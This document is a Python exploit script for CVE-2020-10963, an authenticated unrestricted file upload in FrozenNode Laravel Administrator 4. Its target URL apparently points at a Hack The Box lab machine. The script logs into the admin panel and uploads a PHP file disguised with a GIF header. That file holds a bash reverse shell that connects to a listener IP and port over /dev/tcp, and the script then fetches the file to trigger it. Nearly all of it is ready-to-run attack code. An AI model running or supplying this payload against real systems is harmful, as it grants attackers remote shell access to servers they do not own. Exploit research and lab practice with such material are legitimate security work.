# Exploit title: Laravel Administrator 4 - Unrestricted File Upload (Authenticated)
# Author: Victor Campos and Xavi Beltran
# Contact: vcmartin@protonmail.com
# Exploit Development: https://xavibel.com/2020/03/23/unrestricted-file-upload-in-frozennode-laravel-administrator/
# Date: 25/3/2020
# Software link: https://github.com/FrozenNode/Laravel-Administrator/
# Version : 4
# Tested on: Laravel-Administrator 4
# CVE : CVE-2020-10963

#!/usr/bin/env python

import requests,json,traceback
from requests.auth import HTTPBasicAuth


#Parameters to be set up (ENTER YOUR VALUES)
#===========================================
# Listener IP and port
ip = "10.10.14.65"
port = "4444"
#Admin credentials
user = "admin"
password = "whatever1"
#URLs of the web application
domain = "http://admin.usage.htb" # For example "https://www.example.com"
login_url = "/admin/auth/login" # For example "/user/login"
fileupload_url = "/admin/auth/setting" # For example "/admin/categories/image/file_upload"
uploaded_files_url = "/admin/auth/setting" # For example "/categories/images"

#Reverse shell payload (DO NOT MODIFY THIS SECTION)
#==================================================
#GIF file header
shell = "GIF89a\r\n"
#php reverse shell
shell += "\x3c?php\r\nexec(\"/bin/bash -c \'bash -i \x3e /dev/tcp/" + ip + "/" + port + " 0\x3e&1\'\");?\x3e\r\n"


with requests.Session() as s:
    try:
        print("\n[+] Logging into the panel")
        s.post(domain + login_url, data={'email':user,'password':password,'remember': '1'})
        print("[+] Uploading the malicious file")
        r = s.post(domain + fileupload_url, files={'name':'Picture.png','file': ('test.php',shell)})
        print("[+] Response text:")
        print(r.text)
        shell_file = (json.loads(r.text))["filename"]
        print("[+] Name of uploaded file: " + shell_file)
        print("\n[+] Executing the reverse shell on " + ip + ":" + port + "...")
        r = s.get(domain + uploaded_files_url + '/' + shell_file)
    except Exception as e:
        print(str(traceback.format_exc()))

